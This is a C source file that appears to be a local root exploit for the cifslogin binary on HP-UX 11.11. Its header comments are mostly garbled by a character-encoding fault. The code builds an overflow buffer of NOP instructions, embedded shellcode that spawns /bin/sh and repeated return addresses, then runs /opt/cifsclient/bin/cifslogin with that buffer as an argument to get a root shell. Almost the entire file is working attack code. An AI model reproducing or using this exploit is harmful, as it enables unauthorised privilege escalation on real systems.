/* ex_cifslogin.c
*
*  ��������͸��������ʾ����
*  ���ߣ�san, alert7, eyas, watercloud
*
*  ����cifslogin��©��ȡ��HP-UX 11.11ϵͳ��rootȨ�ޡ�
*  ����  : cc ex_cifslogin -o ex
*  ����  : ��������ڲ���Ŀ�ģ�ʹ�ñ�������ɵ���ǰ�����ʹ���߳е���
*  �Ѳ���: HPUX B11.11
*/

#include<stdio.h>
#define T_LEN  2304
#define BUFF_LEN 2176
#define NOP 0x0b390280
char shellcode[]= "\xe8\x3f\x1f\xfd\xb4\x23\x03\xe8\x60\x60\x3c\x61\x0b\x39\x02"
        "\x99\x34\x1a\x3c\x53\x0b\x43\x06\x1a\x20\x20\x08\x01\x34\x16\x03"
        "\xe8\xe4\x20\xe0\x08\x96\xd6\x03\xfe/bin/shA";
long addr;
char buffer[T_LEN];
main()
{
        int addr_off =800 ;
        int  n=BUFF_LEN/4,i=0;
        long * ap = (long *) &buffer[BUFF_LEN];
        char * sp = &buffer[BUFF_LEN-strlen(shellcode)];
        long * np = (long *) buffer;
        addr = ((long) &addr_off + T_LEN ) & 0xffffff40 +0x40 ;
        for(i=0;i<n;np[i++]=NOP);
        memcpy(sp,shellcode,strlen(shellcode));
        for(i=0;i<(T_LEN-BUFF_LEN)/4;ap[i++]=addr+addr_off);
        execl("/opt/cifsclient/bin/cifslogin","cifslogin","123",buffer,NULL);
}
/*EOF*/
